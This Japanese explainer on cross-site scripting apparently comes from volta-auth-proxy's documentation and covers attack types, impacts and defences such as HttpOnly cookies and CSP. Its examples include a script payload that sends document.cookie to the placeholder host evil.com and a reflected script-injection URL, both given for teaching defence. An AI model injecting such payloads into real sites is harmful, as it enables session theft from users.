# XSS (Cross-Site Scripting / クロスサイトスクリプティング)

## これは何？

クロスサイトスクリプティング（XSS）とは、攻撃者が悪意のある JavaScript コードを Web ページに注入し、そのページを訪れた他のユーザーのブラウザで実行させるセキュリティ攻撃です。

名前の由来は、あるオリジン（攻撃者のサイト）のコードが、別のオリジン（被害者が信頼しているサイト）のコンテキストで実行されることから来ています。CSS（Cascading Style Sheets）と紛らわしいので、「XSS」と略されています。

主に 3 つの種類があります:

### 格納型 XSS（Stored XSS / 永続型）

悪意のあるスクリプトがサーバーに保存されます。たとえば、データベースのフィールド、掲示板の投稿、ユーザープロフィールなどです。そのコンテンツを閲覧した全てのユーザーが、攻撃者のコードを実行してしまいます。

```
  攻撃者がコメントを投稿:
  "いい記事ですね！ <script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>"

  サーバーがデータベースに保存。

  被害者がコメントページを読み込む。
  ブラウザが <script> タグを見つけて実行。
  被害者の Cookie が evil.com に送られる。
```

### 反射型 XSS（Reflected XSS）

悪意のあるスクリプトが URL やフォーム入力の一部として送られ、サーバーがそのままレスポンスに含めて返してしまう（サニタイズせずに）パターンです。

```
  攻撃者がリンクを送る:
  https://trusted-site.com/search?q=<script>alert('hacked')</script>

  被害者がリンクをクリック。
  サーバーが応答: "検索結果: <script>alert('hacked')</script>"
  ブラウザがスクリプトを実行。
```

### DOM ベース XSS

攻撃がブラウザの中だけで起きるパターンです。クライアントサイドの JavaScript が URL やユーザーが操作できるデータを読み取り、適切なエスケープなしにページに挿入してしまいます。

## なぜ重要？

XSS は最もよくある Web の脆弱性のひとつで、被害は深刻になり得ます:

- **Cookie の窃取。** セッション Cookie が JavaScript からアクセス可能だと、攻撃者のスクリプトが `document.cookie` を読み取って自分のサーバーに送信できます。そうすると、被害者になりすませます。
- **トークンの窃取。** アクセストークンや JWT が `localStorage` や `sessionStorage` に保存されていると、XSS で直接読み取れます。
- **アカウントの乗っ取り。** 攻撃者のスクリプトが被害者に代わって API を呼び出せます。パスワードを変更したり、送金したり、攻撃者に管理者権限を付与したりできます。
- **キーロギング。** スクリプトがユーザーのページ上の入力を全て記録できます。
- **フィッシング。** スクリプトがページを改変して、偽のログインフォームを表示し、認証情報を攻撃者に送信できます。

根本的な問題は、ブラウザがサイトの正当な JavaScript と攻撃者が注入した JavaScript を区別できないことです。一度ページに入ってしまえば、全てにアクセスできてしまいます。

## どう動くの？

セッション Cookie を狙った典型的な格納型 XSS 攻撃の流れ:

```
  +----------+     1. 悪意のあるコメントを投稿   +--------+
  |  攻撃者  |--------------------------------->| サーバー |
  +----------+                                  +--------+
                                                    |
                                                    | 2. コメントを保存
                                                    |   （<script> 付き）
                                                    v
                                                +--------+
                                                |  DB    |
                                                +--------+
                                                    |
  +----------+     3. コメント付きページを読み込み  +--------+
  |  被害者  |<---------------------------------| サーバー |
  +----------+                                  +--------+
       |
       | 4. ブラウザが <script> を実行
       | 5. document.cookie が evil.com に送信
       v
  +----------+
  | evil.com |  <-- 攻撃者がセッション Cookie を入手
  +----------+
```

### 防止策

**1. 出力エンコーディング（エスケープ）。**
ユーザー入力を HTML に表示する際、特殊文字をエンコードして、ブラウザがコードではなくテキストとして扱うようにします。`<` は `&lt;`、`>` は `&gt;` になります。

**2. HttpOnly Cookie。**
Cookie に `HttpOnly` フラグを設定すると、JavaScript からは見えなくなります。XSS が成功しても、攻撃者は `document.cookie` で Cookie を読めません。ブラウザはリクエスト時に HttpOnly Cookie を送信しますが、スクリプトからはアクセスできません。

```
Set-Cookie: __volta_session=abc123; HttpOnly; Secure; SameSite=Lax
```

**3. Content Security Policy（CSP）。**
CSP ヘッダは、ブラウザにどの提供元のスクリプトを許可するか指示します。厳格な CSP はインラインスクリプトの実行を完全に防止でき、多くの XSS 攻撃を阻止します。

```
Content-Security-Policy: default-src 'self'; script-src 'self'
```

**4. 機密トークンを localStorage に保存しない。**
`localStorage` は XSS に対する保護がありません。ページ上で動くどんなスクリプトでも読めてしまいます。`HttpOnly` 付きのセッション Cookie の方が安全です。

**5. 入力検証。**
サーバー側でユーザー入力を検証・サニタイズします。想定されていない場所の HTML タグは拒否するか除去します。

## volta-auth-proxy ではどう使っている？

volta-auth-proxy は XSS 防御を設計の中心原則として組み込んでいます:

**HttpOnly セッション Cookie。** volta のセッション Cookie（`__volta_session`）は常に `HttpOnly` で設定されます。つまり、下流のアプリケーションのどこかに XSS の脆弱性があったとしても、攻撃者の JavaScript はセッション Cookie を読み取れません。

```
__volta_session=<session-id>; Path=/; Max-Age=28800; HttpOnly; SameSite=Lax
```

**サーバーサイドのセッション保存。** Cookie 内のセッション ID は意味のない UUID です。実際のセッションデータ（ユーザー ID、テナント ID、有効期限）は volta の PostgreSQL データベースに存在し、ブラウザにはありません。Cookie の値自体からは、攻撃者が解読できる有用な情報はありません。

**短命でサーバーが発行する JWT。** volta は有効期間 5 分の JWT を発行します（`JWT_TTL_SECONDS` で設定可能、デフォルト 300）。これらの JWT は ForwardAuth フローで `X-Volta-JWT` ヘッダを通じて下流のアプリケーションに渡され、ブラウザの localStorage には保存されません。つまり:

- localStorage に XSS で盗まれるのを待っている JWT がない。
- たとえ JWT が傍受されても、数分で期限切れになる。

**自動エスケープ付きテンプレートエンジン。** volta は HTML ページのレンダリングに JTE（Java Template Engine）を使用しています。JTE はデフォルトで出力をエスケープするため、volta 自身のページ（ログインページやテナント選択画面など）での格納型・反射型 XSS を防止します。

アーキテクチャの概要:

```
  ブラウザ                volta-auth-proxy           下流アプリ
  +--------+            +----------------+         +-------------+
  |        |--cookie--->|                |         |             |
  |        | (HttpOnly, | PostgreSQL で   |         |             |
  |        |  JS から    | セッション検索  |         |             |
  |        |  アクセス   |                |         |             |
  |        |  不可)      | JWT を発行      |-------->|             |
  |        |            | (X-Volta-JWT   |  ヘッダ  |             |
  |        |            |  ヘッダ経由、    | のみ、   |             |
  |        |            |  localStorage  |  JS なし |             |
  |        |            |  には保存しない) |         |             |
  +--------+            +----------------+         +-------------+

  下流アプリの XSS では以下を盗めない:
  - セッション Cookie（HttpOnly）
  - JWT（localStorage にない）
```

## よくある間違い

**1. JWT を localStorage に保存する。**
現代の Web アプリで最もよくある間違いです。JWT を `localStorage` に入れると、ページ上のどんな XSS 脆弱性でもトークンを奪えます。セッション管理には HttpOnly Cookie を使いましょう。

**2. セッション Cookie 以外には HttpOnly を設定するが、セッション Cookie には忘れる。**
最も保護すべき Cookie は、アクセスを許可するものです。メインのセッション Cookie に `HttpOnly` が設定されていることを確認しましょう。

**3. 出力エンコーディングなしで CSP だけに頼る。**
CSP は多層防御として優れていますが、唯一の防護策にするべきではありません。出力のエンコードも行いましょう。CSP は設定ミスや一部のエッジケースで回避される可能性があります。

**4. フロントエンドフレームワークが全ての XSS を防ぐと思い込む。**
React、Vue、Angular はデフォルトで出力をエスケープしますが、全てにエスケープをスキップする機能があります（React の `dangerouslySetInnerHTML`、Vue の `v-html`）。ユーザー入力がこれらを通ると、XSS が復活します。

**5. サードパーティスクリプトを忘れる。**
CDN やアナリティクスプロバイダから読み込む全ての `<script>` タグは、ページへのフルアクセス権を持ちます。これらが侵害されたら、事実上 XSS 攻撃と同じです。サードパーティスクリプトを最小限にし、可能な場合は Subresource Integrity（SRI）を使いましょう。

**6. HTTPS が XSS を防ぐと思い込む。**
HTTPS は通信中のデータを保護します。すでにページに注入されたスクリプトに対しては何もしません。XSS はコンテンツ注入の問題であり、通信の問題ではありません。
